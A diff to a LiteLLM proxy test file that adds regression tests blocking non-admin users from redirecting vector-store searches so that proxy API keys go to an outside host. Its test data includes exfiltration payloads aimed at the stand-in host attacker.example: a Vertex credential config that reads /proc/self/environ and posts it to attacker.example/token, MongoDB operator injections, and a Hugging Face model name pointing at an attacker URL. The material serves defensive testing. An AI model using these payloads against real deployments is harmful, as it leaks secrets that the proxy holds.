@@ -16,6 +16,7 @@ from litellm.llms.base_llm.vector_store.transformation import (
 from litellm.proxy._types import CommonProxyErrors, LitellmUserRoles, UserAPIKeyAuth
 from litellm.proxy.vector_store_endpoints.endpoints import (
     _update_request_data_with_litellm_managed_vector_store_registry,
+    build_request_data_from_managed_vector_store,
     index_create,
     index_list,
 )
@@ -35,6 +36,18 @@ from litellm.proxy.vector_store_files_endpoints.endpoints import (
 from litellm.types.utils import EmbeddingResponse, LlmProviders
 from litellm.types.vector_stores import IndexCreateRequest, IndexListResponse
 from litellm.vector_stores.main import _direct_vector_store_embedding_executor
+
+
+_HANDBOOK_EMBEDDING_MODELS = ("text-embedding-3-small", "text-embedding-3-large")
+
+
+def _embedding_router(*model_names: str) -> litellm.Router:
+    return litellm.Router(
+        model_list=[
+            {"model_name": name, "litellm_params": {"model": f"openai/{name}", "api_key": "deployment-key"}}
+            for name in model_names or _HANDBOOK_EMBEDDING_MODELS
+        ]
+    )
 
 
 def _serialize_litellm_params(litellm_params):
@@ -91,12 +104,19 @@ def test_router_vector_store_search_injects_executor_and_request_metadata():
     create_original = MagicMock(return_value="created")
     wrapped_create = router.factory_function(create_original, call_type="vector_store_create")
     assert wrapped_create(name="store") == "created"
-    create_original.assert_called_once_with(name="store")
+    create_call_kwargs = create_original.call_args.kwargs
+    assert create_call_kwargs["name"] == "store"
+    assert create_call_kwargs["router"] is router
+    create_executor = create_call_kwargs["_direct_vector_store_embedding_executor"]
+    assert isinstance(create_executor, RouterVectorStoreEmbeddingExecutor)
     with patch.object(  # test-quality-ok: fallback dispatch is the boundary this wrapper delegates to
         router, "_generic_api_call_with_fallbacks", return_value="created-through-router"
     ) as fallback:
         assert wrapped_create(model="vector-alias", name="store") == "created-through-router"
-    fallback.assert_called_once_with(original_function=create_original, model="vector-alias", name="store")
+    fallback_call_kwargs = fallback.call_args.kwargs
+    assert fallback_call_kwargs["original_function"] is create_original
+    assert fallback_call_kwargs["model"] == "vector-alias"
+    assert fallback_call_kwargs["name"] == "store"
 
 
 @pytest.mark.asyncio
@@ -146,16 +166,15 @@ async def test_vector_store_embedding_executors_preserve_explicit_configuration(
 
     explicit_embedding.assert_not_called()
     explicit_aembedding.assert_not_awaited()
+    # A routed call always uses the deployment's own key, never a caller-supplied override.
     assert mock_router.embedding.call_args.kwargs == {
         "model": "openai/model",
         "input": ["query"],
-        "api_key": "store-key",
         "metadata": {"user_api_key_team_id": "team-a"},
     }
     mock_router.aembedding.assert_awaited_once_with(
         model="openai/model",
         input=["query"],
-        api_key="store-key",
         metadata={"user_api_key_team_id": "team-a"},
     )
 
@@ -301,40 +320,6 @@ async def test_vector_store_file_list_resolves_credentials_from_model_query_para
     assert result["api_base"] == "https://api.openai.com/v1"
     assert result["model"] == "openai/gpt-4o-mini"
     assert "custom_llm_provider" not in result
-    llm_router.get_deployment_credentials_with_provider.assert_called_once_with(
-        model_id="team-openai"
-    )
-
-
-@pytest.mark.asyncio
-async def test_vector_store_file_list_registry_routed_model_skips_key_model_grant():
-    request = MagicMock(spec=Request)
-    request.query_params = {}
-    request.headers = {}
-
-    llm_router = MagicMock()
-    llm_router.get_deployment_credentials_with_provider.return_value = {
-        "api_key": "sk-team-openai",
-        "api_base": "https://api.openai.com/v1",
-        "custom_llm_provider": "openai",
-        "model": "openai/gpt-4o-mini",
-    }
-
-    data = {"vector_store_id": "vs_123", "model": "team-openai"}
-    user_api_key_dict = UserAPIKeyAuth(
-        models=["restricted-deployment"],
-        team_models=["restricted-deployment"],
-    )
-
-    result = await _update_request_data_with_model_routing_hint(
-        data=data,
-        request=request,
-        llm_router=llm_router,
-        user_api_key_dict=user_api_key_dict,
-    )
-
-    assert result["api_key"] == "sk-team-openai"
-    assert result["model"] == "openai/gpt-4o-mini"
     llm_router.get_deployment_credentials_with_provider.assert_called_once_with(
         model_id="team-openai"
     )
@@ -605,44 +590,6 @@ async def test_vector_store_file_list_authorizes_model_query_param_before_creden
             llm_router=llm_router,
             user_api_key_dict=user_api_key_dict,
         )
-
-    llm_router.get_deployment_credentials_with_provider.assert_not_called()
-
-
-@pytest.mark.asyncio
-async def test_vector_store_file_list_model_query_param_enforces_project_model_grant():
-    from litellm.proxy._types import LiteLLM_ProjectTableCachedObj, LiteLLM_TeamTableCachedObj
-    from litellm.proxy.auth.auth_checks import ProxyException
-    from litellm.proxy.common_utils.user_api_key_cache import UserApiKeyCache, project_cache_key
-
-    request = MagicMock(spec=Request)
-    request.query_params = {"model": "team-openai"}
-    request.headers = {}
-
-    llm_router = MagicMock()
-    llm_router.model_group_alias = {}
-    cache = UserApiKeyCache()
-    await cache.async_set_cache(
-        key="team_id:team-123",
-        value=LiteLLM_TeamTableCachedObj(team_id="team-123", models=["team-openai"]),
-    )
-    await cache.async_set_cache(
-        key=project_cache_key("proj-1"),
-        value=LiteLLM_ProjectTableCachedObj(project_id="proj-1", models=["other-deployment"]),
-    )
-    user_api_key_dict = UserAPIKeyAuth(team_id="team-123", team_models=["team-openai"], project_id="proj-1")
-
-    with (
-        patch("litellm.proxy.proxy_server.prisma_client", MagicMock()),  # test-quality-ok: proxy_server global, no seam
-        patch("litellm.proxy.proxy_server.user_api_key_cache", cache),  # test-quality-ok: proxy_server global, no seam
-    ):
-        with pytest.raises(ProxyException):
-            await _update_request_data_with_model_routing_hint(
-                data={"vector_store_id": "vs_123"},
-                request=request,
-                llm_router=llm_router,
-                user_api_key_dict=user_api_key_dict,
-            )
 
     llm_router.get_deployment_credentials_with_provider.assert_not_called()
 
@@ -2142,6 +2089,364 @@ async def test_vector_store_update_and_list_synchronization():
     ), "List should return updated data from database"
 
 
+async def _create_store_with_env_reference(user_role: LitellmUserRoles) -> MagicMock:
+    from litellm.types.vector_stores import LiteLLM_ManagedVectorStore
+
+    mock_prisma_client = MagicMock()
+    mock_prisma_client.db.litellm_managedvectorstorestable.find_unique = AsyncMock(return_value=None)
+    created_row = MagicMock()
+    created_row.model_dump.return_value = {"vector_store_id": "vs-env", "custom_llm_provider": "openai"}
+    mock_prisma_client.db.litellm_managedvectorstorestable.create = AsyncMock(return_value=created_row)
+    vector_store = LiteLLM_ManagedVectorStore(
+        vector_store_id="vs-env",
+        custom_llm_provider="openai",
+        litellm_params={
+            "api_base": "https://attacker.example",
+            "litellm_embedding_config": {"api_key": "os.environ/LITELLM_MASTER_KEY"},
+        },
+    )
+    with (
+        patch(
+            "litellm.proxy.vector_store_endpoints.management_endpoints.check_feature_access_for_user",
+            new_callable=AsyncMock,
+        ),
+        patch("litellm.proxy.proxy_server.prisma_client", mock_prisma_client),
+        patch.object(litellm, "vector_store_registry", None),
+    ):
+        await new_vector_store(vector_store=vector_store, user_api_key_dict=UserAPIKeyAuth(user_role=user_role))
+    return mock_prisma_client
+
+
+@pytest.mark.asyncio
+async def test_new_vector_store_rejects_os_environ_references_from_non_admins():
+    """Regression: any key with vector store access could save os.environ/LITELLM_MASTER_KEY next to its own
+    api_base, and the next search sent the resolved secret there."""
+    with pytest.raises(HTTPException) as exc_info:
+        await _create_store_with_env_reference(LitellmUserRoles.INTERNAL_USER)
+
+    assert exc_info.value.status_code == 403
+
+
+@pytest.mark.asyncio
+async def test_new_vector_store_accepts_os_environ_references_from_proxy_admins():
+    mock_prisma_client = await _create_store_with_env_reference(LitellmUserRoles.PROXY_ADMIN)
+
+    created = mock_prisma_client.db.litellm_managedvectorstorestable.create.await_args.kwargs["data"]
+    assert json.loads(created["litellm_params"])["litellm_embedding_config"] == {
+        "api_key": "os.environ/LITELLM_MASTER_KEY"
+    }
+
+
+async def _create_store(
+    user_role: LitellmUserRoles,
+    registry: object = None,
+    user_api_key_dict: UserAPIKeyAuth | None = None,
+    llm_router: object = None,
+    **store_fields,
+) -> MagicMock:
+    from litellm.types.vector_stores import LiteLLM_ManagedVectorStore
+
+    mock_prisma_client = MagicMock()
+    mock_prisma_client.db.litellm_managedvectorstorestable.find_unique = AsyncMock(return_value=None)
+    created_row = MagicMock()
+    created_row.model_dump.return_value = {"vector_store_id": "vs-new", "custom_llm_provider": "openai"}
+    mock_prisma_client.db.litellm_managedvectorstorestable.create = AsyncMock(return_value=created_row)
+    with (
+        patch(
+            "litellm.proxy.vector_store_endpoints.management_endpoints.check_feature_access_for_user",
+            new_callable=AsyncMock,
+        ),
+        patch("litellm.proxy.proxy_server.prisma_client", mock_prisma_client),
+        patch("litellm.proxy.proxy_server.llm_router", llm_router or _embedding_router()),
+        patch.object(litellm, "vector_store_registry", registry),
+    ):
+        await new_vector_store(
+            vector_store=LiteLLM_ManagedVectorStore(
+                **{"vector_store_id": "vs-new", "custom_llm_provider": "openai", **store_fields}
+            ),
+            user_api_key_dict=user_api_key_dict or UserAPIKeyAuth(user_role=user_role),
+        )
+    return mock_prisma_client
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize(
+    "store_fields",
+    [
+        {"litellm_credential_name": "openai-prod", "litellm_params": {"api_base": "https://attacker.example"}},
+        {"litellm_params": {"api_base": "https://attacker.example", "litellm_credential_name": "openai-prod"}},
+    ],
+    ids=["top-level", "in-litellm-params"],
+)
+async def test_new_vector_store_rejects_credential_names_from_non_admins(store_fields):
+    """Regression: a key with vector store access saved a store naming a proxy credential next to its own
+    api_base, and the next search merged the credential's api_key in and sent it there."""
+    with pytest.raises(HTTPException) as exc_info:
+        await _create_store(LitellmUserRoles.INTERNAL_USER, **store_fields)
+
+    assert exc_info.value.status_code == 403
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize(
+    "litellm_params",
+    [
+        {"api_base": "https://attacker.example"},
+        {"litellm_embedding_model": "embed", "litellm_embedding_config": {"api_base": "https://attacker.example"}},
+        {"api_key": "sk-mine", "aws_role_name": "arn:aws:iam::123:role/prod"},
+        {"tenant_id": "other-tenant", "client_id": "other-client"},
+        {"mongodb_database": "kb", "valkey_host": "attacker.example"},
+    ],
+    ids=["api-base-without-key", "nested-embedding-config", "aws-role", "azure-identity", "host"],
+)
+async def test_new_vector_store_rejects_endpoint_params_from_non_admins(litellm_params):
+    """Regression: a store saved by a non-admin with its own api_base and no api_key made the provider fall back to
+    the proxy's env key (OPENAI_API_KEY, ...) and send it there, and a nested litellm_embedding_config.api_base
+    sent a router deployment's key to the caller's host."""
+    with pytest.raises(HTTPException) as exc_info:
+        await _create_store(LitellmUserRoles.INTERNAL_USER, litellm_params=litellm_params)
+
+    assert exc_info.value.status_code == 403
+    assert "Only proxy admins" in exc_info.value.detail
+
+
+@pytest.mark.asyncio
+
+
+@pytest.mark.asyncio
+async def test_new_vector_store_lets_a_proxy_admin_set_endpoints():
+    mock_prisma_client = await _create_store(
+        LitellmUserRoles.PROXY_ADMIN,
+        litellm_params={"api_base": "https://search.example", "litellm_embedding_config": {"api_base": "https://e"}},
+    )
+
+    created = mock_prisma_client.db.litellm_managedvectorstorestable.create.await_args.kwargs["data"]
+    assert json.loads(created["litellm_params"])["api_base"] == "https://search.example"
+
+
+_VERTEX_WORKLOAD_IDENTITY_CREDENTIALS = {
+    "type": "external_account",
+    "audience": "x",
+    "subject_token_type": "urn:ietf:params:oauth:token-type:jwt",
+    "token_url": "https://attacker.example/token",
+    "credential_source": {"file": "/proc/self/environ"},
+}
+
+def _first_key(params: dict) -> str:
+    return next(iter(params))
+
+
+_KEYS_OUTSIDE_THE_NON_ADMIN_ALLOWLIST = [
+    {"vertex_credentials": _VERTEX_WORKLOAD_IDENTITY_CREDENTIALS},
+    {"vertex_ai_credentials": _VERTEX_WORKLOAD_IDENTITY_CREDENTIALS},
+    {"azure_ad_token": "eyJ-mine"},
+    {"aws_session_tags": {"team": "admin"}},
+    {"s3_endpoint_url": "https://attacker.example"},
+    {"sagemaker_base_url": "https://attacker.example"},
+    {"deployment_url": "https://attacker.example"},
+    {"aws_bedrock_project_id": "other-project"},
+    {"azure_scope": "https://attacker.example/.default"},
+    {"s3_bucket": "attacker-bucket"},
+    {"ssl_verify": False},
+    {"input_cost_per_query": 0},
+    {"vector_db_config": {"pinecone": {"index_name": "x"}}},
+    {"mongodb_filter_fields": [{"$where": "sleep(1000)"}]},
+    {"mongodb_collection": {"$ne": None}},
+]
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize("litellm_params", _KEYS_OUTSIDE_THE_NON_ADMIN_ALLOWLIST, ids=_first_key)
+async def test_new_vector_store_rejects_params_outside_the_non_admin_allowlist(litellm_params):
+    """Regression: the write check was a denylist of endpoint keys, and each review found another key (a
+    vertex_credentials workload identity config makes google-auth read a local file and post it to token_url)
+    that let a non-admin decide where a store sends traffic or what signs it."""
+    with pytest.raises(HTTPException) as exc_info:
+        await _create_store(LitellmUserRoles.INTERNAL_USER, litellm_params=litellm_params)
+
+    assert exc_info.value.status_code == 403
+    assert next(iter(litellm_params)) in exc_info.value.detail
+
+
+_ATTACKER_EMBEDDING_MODEL = "huggingface/https://attacker.example/steal"
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize("key", ["litellm_embedding_model", "embedding_model"])
+async def test_new_vector_store_rejects_embedding_models_the_proxy_does_not_serve_from_non_admins(key):
+    """Regression: a non-admin saved huggingface/<their url> as the embedding model, and each search then
+    embedded the query through litellm directly, sending the proxy's HUGGINGFACE_API_KEY to that url."""
+    with pytest.raises(HTTPException) as exc_info:
+        await _create_store(LitellmUserRoles.INTERNAL_USER, litellm_params={key: _ATTACKER_EMBEDDING_MODEL})
+
+    assert exc_info.value.status_code == 400
+    assert exc_info.value.detail.startswith(f"embedding model {_ATTACKER_EMBEDDING_MODEL} is not configured")
+
+
+@pytest.mark.asyncio
+async def test_new_vector_store_rejects_url_like_embedding_models_even_when_a_wildcard_deployment_serves_them():
+    """Regression: a `huggingface/*` wildcard deployment makes router_serves_model true for any suffix, so
+    the router-serves check alone let a non-admin pick huggingface/<attacker host> as the embedding model
+    whenever the proxy had a wildcard deployment for that provider, reaching that host with the proxy's
+    own provider key on every search."""
+    wildcard_router = litellm.Router(
+        model_list=[{"model_name": "huggingface/*", "litellm_params": {"model": "huggingface/*"}}]
+    )
+
+    with pytest.raises(HTTPException) as exc_info:
+        await _create_store(
+            LitellmUserRoles.INTERNAL_USER,
+            llm_router=wildcard_router,
+            litellm_params={"litellm_embedding_model": _ATTACKER_EMBEDDING_MODEL},
+        )
+
+    assert exc_info.value.status_code == 400
+    assert exc_info.value.detail.startswith(f"embedding model {_ATTACKER_EMBEDDING_MODEL} is not configured")
+
+
+@pytest.mark.asyncio
+async def test_new_vector_store_rejects_embedding_models_the_callers_key_cannot_call():
+    with pytest.raises(HTTPException) as exc_info:
+        await _create_store(
+            LitellmUserRoles.INTERNAL_USER,
+            user_api_key_dict=UserAPIKeyAuth(user_role=LitellmUserRoles.INTERNAL_USER, models=["gpt-4o"]),
+            litellm_params={"litellm_embedding_model": "text-embedding-3-small"},
+        )
+
+    assert exc_info.value.status_code == 403
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize(
+    "user_api_key_dict",
+    [
+        UserAPIKeyAuth(user_role=LitellmUserRoles.INTERNAL_USER, models=["text-embedding-3-small"]),
+        UserAPIKeyAuth(user_role=LitellmUserRoles.PROXY_ADMIN, models=["gpt-4o"]),
+    ],
+    ids=["non-admin-with-access", "admin"],
+)
+async def test_new_vector_store_saves_a_router_served_embedding_model(user_api_key_dict):
+    mock_prisma_client = await _create_store(
+        LitellmUserRoles.INTERNAL_USER,
+        user_api_key_dict=user_api_key_dict,
+        litellm_params={"litellm_embedding_model": "text-embedding-3-small"},
+    )
+
+    created = mock_prisma_client.db.litellm_managedvectorstorestable.create.await_args.kwargs["data"]
+    assert json.loads(created["litellm_params"])["litellm_embedding_model"] == "text-embedding-3-small"
+
+
+_MONGODB_DATA_SHAPE_PARAMS = {
+    "litellm_embedding_model": "text-embedding-3-small",
+    "mongodb_database": "knowledge",
+    "mongodb_collection": "handbook",
+    "mongodb_text_field": "body",
+    "mongodb_embedding_field": "vector",
+    "mongodb_num_candidates": 200,
+    "mongodb_dimensions": 1536,
+    "mongodb_similarity": "cosine",
+    "mongodb_filter_fields": ["team", "year"],
+    "mongodb_text_index": "handbook_text",
+    "mongodb_hybrid_search": True,
+    "mongodb_hybrid_weights": {"vector": 0.7, "text": 0.3},
+    "mongodb_exact_search": False,
+    "mongodb_score_threshold": 0.5,
+    "custom_metadata": {"owner": {"team": "docs"}},
+}
+
+
+@pytest.mark.asyncio
+async def test_new_vector_store_lets_a_non_admin_save_mongodb_data_shape_params_on_the_deployment_sidecar(
+    monkeypatch,
+):
+    from litellm.llms.mongodb.vector_stores.transformation import MongoDBVectorStoreConfig
+    from litellm.proxy.vector_store_endpoints.endpoints import build_request_data_from_managed_vector_store
+    from litellm.types.router import GenericLiteLLMParams
+    from litellm.types.vector_stores import LiteLLM_ManagedVectorStore
+
+    monkeypatch.setenv("MONGODB_SIDECAR_API_BASE", "https://deployment-sidecar.example")
+    monkeypatch.setenv("MONGODB_SIDECAR_API_KEY", "sidecar-key")
+
+    mock_prisma_client = await _create_store(
+        LitellmUserRoles.INTERNAL_USER, custom_llm_provider="mongodb", litellm_params=_MONGODB_DATA_SHAPE_PARAMS
+    )
+
+    persisted = json.loads(
+        mock_prisma_client.db.litellm_managedvectorstorestable.create.await_args.kwargs["data"]["litellm_params"]
+    )
+    assert {key: persisted.get(key) for key in _MONGODB_DATA_SHAPE_PARAMS} == _MONGODB_DATA_SHAPE_PARAMS
+    search_params = build_request_data_from_managed_vector_store(
+        LiteLLM_ManagedVectorStore(vector_store_id="vs-new", custom_llm_provider="mongodb", litellm_params=persisted)
+    )
+    config = MongoDBVectorStoreConfig()
+    assert (
+        config.get_complete_url(api_base=search_params.get("api_base"), litellm_params=search_params)
+        == "https://deployment-sidecar.example"
+    )
+    headers = config.validate_environment(
+        headers={}, litellm_params=GenericLiteLLMParams.model_validate(dict(search_params))
+    )
+    assert headers["Authorization"] == "Bearer sidecar-key"
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize(
+    "litellm_params",
+    [
+        {"vertex_credentials": _VERTEX_WORKLOAD_IDENTITY_CREDENTIALS, "vertex_project": "p"},
+        {
+            "api_base": "http://127.0.0.1:8080",
+            "api_key": "os.environ/MONGODB_SIDECAR_API_KEY",
+            "mongodb_database": "kb",
+        },
+    ],
+    ids=["vertex-credentials", "company-handbook-sidecar"],
+)
+async def test_new_vector_store_lets_a_proxy_admin_save_any_params(litellm_params):
+    mock_prisma_client = await _create_store(LitellmUserRoles.PROXY_ADMIN, litellm_params=litellm_params)
+
+    created = mock_prisma_client.db.litellm_managedvectorstorestable.create.await_args.kwargs["data"]
+    persisted = json.loads(created["litellm_params"])
+    assert {key: persisted.get(key) for key in litellm_params} == litellm_params
+
+
+@pytest.mark.asyncio
+async def test_new_vector_store_accepts_credential_names_from_proxy_admins():
+    mock_prisma_client = await _create_store(LitellmUserRoles.PROXY_ADMIN, litellm_credential_name="openai-prod")
+
+    created = mock_prisma_client.db.litellm_managedvectorstorestable.create.await_args.kwargs["data"]
+    assert created["litellm_credential_name"] == "openai-prod"
+
+
+def _registry_with_config_store() -> object:
+    from litellm.vector_stores.vector_store_registry import VectorStoreRegistry
+
+    registry = VectorStoreRegistry()
+    registry.config_vector_store_ids.add("vs-new")
+    return registry
+
+
+@pytest.mark.asyncio
+async def test_new_vector_store_rejects_a_non_admin_reusing_a_config_store_id():
+    """Regression: a database row with a config store's id took its place, so a non-admin could redirect every
+    caller's search queries for that store to their own api_base."""
+    with pytest.raises(HTTPException) as exc_info:
+        await _create_store(
+            LitellmUserRoles.INTERNAL_USER,
+            registry=_registry_with_config_store(),
+            litellm_params={"mongodb_collection": "docs"},
+        )
+
+    assert exc_info.value.status_code == 403
+
+
+@pytest.mark.asyncio
+async def test_new_vector_store_lets_a_proxy_admin_reuse_a_config_store_id():
+    mock_prisma_client = await _create_store(LitellmUserRoles.PROXY_ADMIN, registry=_registry_with_config_store())
+
+    mock_prisma_client.db.litellm_managedvectorstorestable.create.assert_awaited_once()
+
+
 @pytest.mark.asyncio
 async def test_new_vector_store_persists_embedding_reference_without_credentials():
     import json
@@ -2161,10 +2466,7 @@ async def test_new_vector_store_persists_embedding_reference_without_credentials
     }
 
     # Mock user API key
-    mock_user_api_key = MagicMock(spec=UserAPIKeyAuth)
-    mock_user_api_key.user_role = None
-    mock_user_api_key.team_id = None
-    mock_user_api_key.user_id = None
+    mock_user_api_key = UserAPIKeyAuth()
 
     # Mock database operations
     mock_prisma_client.db.litellm_managedvectorstorestable.find_unique = AsyncMock(
@@ -2192,6 +2494,7 @@ async def test_new_vector_store_persists_embedding_reference_without_credentials
 
     with (
         patch("litellm.proxy.proxy_server.prisma_client", mock_prisma_client),
+        patch("litellm.proxy.proxy_server.llm_router", _embedding_router("text-embedding-ada-002")),
         patch.object(litellm, "vector_store_registry", mock_registry),
     ):
         result = await new_vector_store(vector_store=vector_store_data, user_api_key_dict=mock_user_api_key)
@@ -2240,10 +2543,7 @@ async def test_new_vector_store_auto_resolves_from_router():
     mock_router.get_deployment_by_model_group_name.return_value = mock_deployment
 
     # Mock user API key
-    mock_user_api_key = MagicMock(spec=UserAPIKeyAuth)
-    mock_user_api_key.user_role = None
-    mock_user_api_key.team_id = None
-    mock_user_api_key.user_id = None
+    mock_user_api_key = UserAPIKeyAuth()
 
     # Mock database operations
     mock_prisma_client.db.litellm_managedvectorstorestable.find_unique = AsyncMock(
@@ -2665,6 +2965,169 @@ class TestRedactSensitiveLitellmParams:
         assert out == REDACTED_BY_LITELM_STRING
 
 
+_PROD_CREDENTIAL_KEY = "sk-prod-credential"
+
+
+def _search_managed_store(
+    store: LiteLLM_ManagedVectorStore, body: dict, *, in_registry: bool = True
+) -> dict[str, object]:
+    """Runs a proxy search the way vector_store_search builds it (the request body with the managed store's data
+    on top) through the SDK search, and returns the URL and key the provider would send the request with."""
+    from litellm.types.utils import CredentialItem
+    from litellm.vector_stores import main as vector_stores_main
+    from litellm.vector_stores.vector_store_registry import VectorStoreRegistry
+
+    sent: dict[str, object] = {}
+
+    def capture_request(**kwargs):
+        litellm_params = kwargs["litellm_params"]
+        sent["url"] = kwargs["vector_store_provider_config"].get_complete_url(
+            litellm_params.api_base, litellm_params.model_dump()
+        )
+        sent["api_key"] = litellm_params.api_key
+        return {"object": "vector_store.search_results.page", "search_query": "q", "data": []}
+
+    credential = CredentialItem(
+        credential_name="prod", credential_values={"api_key": _PROD_CREDENTIAL_KEY}, credential_info={}
+    )
+    with (
+        patch.object(litellm, "vector_store_registry", VectorStoreRegistry(vector_stores=[store] if in_registry else [])),
+        patch.object(litellm, "credential_list", [credential]),
+        patch.object(  # test-quality-ok: the outbound HTTP boundary, where the URL and key surface
+            vector_stores_main.base_llm_http_handler, "vector_store_search_handler", side_effect=capture_request
+        ),
+    ):
+        vector_stores_main.search(
+            query="q",
+            **{**body, "vector_store_id": store["vector_store_id"], **build_request_data_from_managed_vector_store(store)},
+        )
+    return sent
+
+
+@pytest.mark.parametrize(
+    "store,body,in_registry,expected_url",
+    [
+        (
+            LiteLLM_ManagedVectorStore(
+                vector_store_id="vs1", custom_llm_provider="openai", litellm_credential_name="prod", litellm_params={}
+            ),
+            {"api_base": "https://attacker.example"},
+            True,
+            "https://api.openai.com/v1/vector_stores",
+        ),
+        (
+            LiteLLM_ManagedVectorStore(
+                vector_store_id="vs1", custom_llm_provider="openai", litellm_credential_name="prod", litellm_params={}
+            ),
+            {"api_base": "https://attacker.example"},
+            False,
+            "https://api.openai.com/v1/vector_stores",
+        ),
+        (
+            LiteLLM_ManagedVectorStore(
+                vector_store_id="vs2", custom_llm_provider="openai", litellm_params={"litellm_credential_name": "prod"}
+            ),
+            {"api_base": "https://attacker.example"},
+            True,
+            "https://api.openai.com/v1/vector_stores",
+        ),
+        (
+            LiteLLM_ManagedVectorStore(
+                vector_store_id="vs3",
+                custom_llm_provider="azure_ai",
+                litellm_credential_name="prod",
+                litellm_params={"api_base": "https://good.search.windows.net"},
+            ),
+            {"azure_search_service_name": "attacker.example/x?"},
+            True,
+            "https://good.search.windows.net",
+        ),
+        (
+            LiteLLM_ManagedVectorStore(
+                vector_store_id="vs4",
+                custom_llm_provider="azure_ai",
+                litellm_credential_name="prod",
+                litellm_params={"azure_search_service_name": "good"},
+            ),
+            {"azure_search_service_name": "attacker.example/x?", "api_base": "https://attacker.example"},
+            False,
+            "https://good.search.windows.net",
+        ),
+        (
+            LiteLLM_ManagedVectorStore(
+                vector_store_id="vs5",
+                custom_llm_provider="openai",
+                litellm_credential_name="prod",
+                litellm_params={"api_base": "https://admin-proxy.example/v1"},
+            ),
+            {"api_base": "https://attacker.example"},
+            True,
+            "https://admin-proxy.example/v1/vector_stores",
+        ),
+    ],
+    ids=[
+        "row-credential",
+        "row-credential-not-in-registry",
+        "params-credential",
+        "azure-service-name",
+        "azure-service-name-not-in-registry",
+        "admin-saved-endpoint-with-credential",
+    ],
+)
+def test_search_pins_a_managed_stores_endpoints_over_the_request(store, body, in_registry, expected_url, monkeypatch):
+    """Regression: a store's endpoint key that the store and its credential left unset was filled from the request
+    body (api_base, azure_search_service_name), so the credential's api_key went to the caller's host, and a store
+    naming a credential lost the endpoint a proxy admin saved on it."""
+    monkeypatch.delenv("OPENAI_BASE_URL", raising=False)
+    monkeypatch.delenv("OPENAI_API_BASE", raising=False)
+    monkeypatch.setattr(litellm, "api_base", None)
+
+    sent = _search_managed_store(store, body, in_registry=in_registry)
+
+    assert sent == {"url": expected_url, "api_key": _PROD_CREDENTIAL_KEY}
+
+
+def test_build_request_data_keeps_the_deployments_mongodb_sidecar_store(monkeypatch):
+    sidecar = "https://css-mongodb-sidecar-test-ucpy26yrfa-uc.a.run.app"
+    monkeypatch.setenv("MONGODB_SIDECAR_API_KEY", "sidecar-secret")
+    store = LiteLLM_ManagedVectorStore(
+        vector_store_id="company_handbook",
+        custom_llm_provider="mongodb",
+        litellm_params={
+            "api_base": sidecar,
+            "api_key": "os.environ/MONGODB_SIDECAR_API_KEY",
+            "mongodb_database": "handbook",
+            "mongodb_collection": "chunks",
+        },
+    )
+
+    request_data = {"api_base": "https://attacker.example", **build_request_data_from_managed_vector_store(store)}
+
+    assert request_data["api_base"] == sidecar
+    assert request_data["api_key"] == "sidecar-secret"
+    assert request_data["mongodb_collection"] == "chunks"
+
+
+def test_build_request_data_keeps_a_per_store_sidecar_next_to_its_credential():
+    """Regression: a store naming a credential lost the sidecar api_base a proxy admin saved on it."""
+    from litellm.types.utils import CredentialItem
+
+    store = LiteLLM_ManagedVectorStore(
+        vector_store_id="team_kb",
+        custom_llm_provider="mongodb",
+        litellm_credential_name="team-sidecar",
+        litellm_params={"api_base": "https://team-sidecar.example", "mongodb_collection": "chunks"},
+    )
+    credential = CredentialItem(
+        credential_name="team-sidecar", credential_values={"api_key": "team-sidecar-key"}, credential_info={}
+    )
+
+    with patch.object(litellm, "credential_list", [credential]):
+        request_data = {"api_base": "https://attacker.example", **build_request_data_from_managed_vector_store(store)}
+
+    assert request_data["api_base"] == "https://team-sidecar.example"
+
+
 class TestUpdateVectorStoreAccessControlAndRedaction:
     """
     ``/vector_store/update`` previously skipped per-store access control
@@ -2845,6 +3308,683 @@ class TestUpdateVectorStoreAccessControlAndRedaction:
 
         assert exc_info.value.status_code == 404
         assert exc_info.value.detail == "Vector store with ID vs_owned not found"
+
+    @staticmethod
+    def _mock_prisma_for_update(saved_litellm_params: dict, **saved_row_fields) -> MagicMock:
+        """``update`` echoes back whatever ``data`` the endpoint actually wrote, the way Postgres would, so
+        assertions on the response exercise the endpoint's own merge logic instead of a hand-picked fixture."""
+        existing_row = MagicMock()
+        existing_row.model_dump = MagicMock(
+            return_value={
+                "vector_store_id": "vs_owned",
+                "team_id": "team-A",
+                "litellm_params": saved_litellm_params,
+                **saved_row_fields,
+            }
+        )
+
+        def _apply_update(where: dict, data: dict) -> MagicMock:
+            updated_row = MagicMock()
+            updated_row.model_dump = MagicMock(
+                return_value={"vector_store_id": "vs_owned", "team_id": "team-A", **data}
+            )
+            return updated_row
+
+        mock_prisma_client = MagicMock()
+        mock_prisma_client.db.litellm_managedvectorstorestable.find_unique = AsyncMock(return_value=existing_row)
+        mock_prisma_client.db.litellm_managedvectorstorestable.update = AsyncMock(side_effect=_apply_update)
+        return mock_prisma_client
+
+    @pytest.mark.asyncio
+    async def test_update_litellm_params_merges_over_saved_keeping_other_keys(self):
+        """Before litellm_params existed on VectorStoreUpdateRequest, provider settings like
+        mongodb_collection could never be edited after the store was created."""
+        from litellm.proxy.vector_store_endpoints.management_endpoints import update_vector_store
+        from litellm.types.vector_stores import VectorStoreUpdateRequest
+
+        saved = {"mongodb_database": "knowledge", "mongodb_collection": "old_collection", "api_key": "sk-real-secret"}
+        mock_prisma_client = self._mock_prisma_for_update(saved)
+
+        with (
+            patch(
+                "litellm.proxy.vector_store_endpoints.management_endpoints.check_feature_access_for_user",
+                new_callable=AsyncMock,
+            ),
+            patch(
+                "litellm.proxy.vector_store_endpoints.management_endpoints._check_vector_store_access",
+                new_callable=AsyncMock,
+                return_value=True,
+            ),
+            patch("litellm.proxy.proxy_server.prisma_client", mock_prisma_client),
+            patch("litellm.vector_store_registry", None),
+        ):
+            await update_vector_store(
+                data=VectorStoreUpdateRequest(
+                    vector_store_id="vs_owned", litellm_params={"mongodb_collection": "new_collection"}
+                ),
+                user_api_key_dict=UserAPIKeyAuth(user_id="owner", team_id="team-A"),
+            )
+
+        persisted = json.loads(
+            mock_prisma_client.db.litellm_managedvectorstorestable.update.call_args.kwargs["data"]["litellm_params"]
+        )
+        assert persisted["mongodb_collection"] == "new_collection"
+        assert persisted["mongodb_database"] == "knowledge"
+        assert persisted["api_key"] == "sk-real-secret"
+
+    @pytest.mark.asyncio
